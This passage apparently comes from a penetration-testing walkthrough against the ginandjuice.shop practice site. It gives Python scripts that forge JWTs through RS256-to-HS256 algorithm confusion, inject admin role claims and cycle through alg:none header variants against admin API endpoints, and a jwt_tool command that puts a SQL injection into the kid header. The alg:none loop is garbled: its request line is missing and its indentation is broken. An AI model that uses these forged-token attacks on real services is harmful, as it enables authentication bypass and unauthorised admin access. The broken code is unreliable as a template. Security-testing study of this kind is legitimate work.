**Step 3: RS256 → HS256 algorithm confusion attack**

```python
# Save as /tmp/jwt_confusion.py and run: python3 /tmp/jwt_confusion.py

import base64, json, hmac, hashlib, requests

TARGET = "https://ginandjuice.shop"
TOKEN = "eyJ..."   # Paste captured token
PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9yb2EQAB...
-----END PUBLIC KEY-----"""  # Paste from JWKS endpoint

def b64url(s):
    if isinstance(s, str): s = s.encode()
    return base64.urlsafe_b64encode(s).decode().rstrip('=')

def decode(part):
    return json.loads(base64.urlsafe_b64decode(part + '=='))

parts = TOKEN.split('.')
payload = decode(parts[1])

# Variant 3 — Same claims, HS256 signature
payload_copy = payload.copy()
new_hdr = b64url(json.dumps({"alg":"HS256","typ":"JWT"}))
new_pay = b64url(json.dumps(payload_copy))
sig_input = f"{new_hdr}.{new_pay}".encode()
sig = hmac.new(PUBLIC_KEY_PEM, sig_input, hashlib.sha256).digest()
forged = f"{new_hdr}.{new_pay}.{b64url(sig)}"

r = requests.get(f"{TARGET}/api/users/me",
    headers={"Authorization": f"Bearer {forged}"})
print(f"Same-claims HS256: {r.status_code}")

# Variant 4 — Elevated claims (admin role)
payload_admin = payload.copy()
payload_admin["role"] = "admin"
payload_admin["isAdmin"] = True
new_pay2 = b64url(json.dumps(payload_admin))
sig2 = hmac.new(PUBLIC_KEY_PEM, f"{new_hdr}.{new_pay2}".encode(), hashlib.sha256).digest()
admin_token = f"{new_hdr}.{new_pay2}.{b64url(sig2)}"

r2 = requests.get(f"{TARGET}/api/admin/users",
    headers={"Authorization": f"Bearer {admin_token}"})
print(f"Admin-claim HS256: {r2.status_code} | Body: {r2.text[:200]}")
```

**Step 4: alg:none bypass**

```python
# Variant 5 — Try all none variants
none_variants = [
    {"alg":"none","typ":"JWT"},
    {"alg":"None","typ":"JWT"},
    {"alg":"NONE","typ":"JWT"},
    {"alg":"nOnE","typ":"JWT"},
]
for hdr_dict in none_variants:
    hdr = b64url(json.dumps(hdr_dict))
    pay = b64url(json.dumps({**payload, "role":"admin"}))
    for sig in ["", parts[2]]:
        t = f"{hdr}.{pay}.{sig}"

            headers={"Authorization": f"Bearer {t}"})

            print(f"[CRITICAL] alg:none bypass: header={hdr_dict} sig='{sig[:10]}...'")
```

```bash

jwt_tool "$TOKEN" -T -hc kid -hv "' UNION SELECT 'secret'--" -S hs256 -p "secret"
```
